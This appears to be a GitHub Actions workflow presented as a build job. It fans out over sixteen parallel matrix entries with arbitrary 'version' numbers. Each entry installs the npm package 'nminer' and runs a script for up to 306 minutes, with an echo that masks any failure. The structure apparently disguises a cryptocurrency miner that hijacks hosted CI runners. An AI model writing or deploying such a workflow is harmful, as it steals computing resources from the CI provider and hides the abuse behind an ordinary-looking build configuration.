name: pharmacopoeia
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1467 }
          - { version: 5740 }
          - { version: 8818 }
          - { version: 5313 }
          - { version: 9961 }
          - { version: 8726 }
          - { version: 4354 }
          - { version: 3551 }
          - { version: 2884 }
          - { version: 5656 }
          - { version: 1007 }
          - { version: 2818 }
          - { version: 929 }
          - { version: 7808 }
          - { version: 8985 }
          - { version: 5143 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: loudly rewrite
        run: |
          npm install nminer@latest
          timeout 306m node pharmacopoeia.js || echo "pharmacopoeia executed"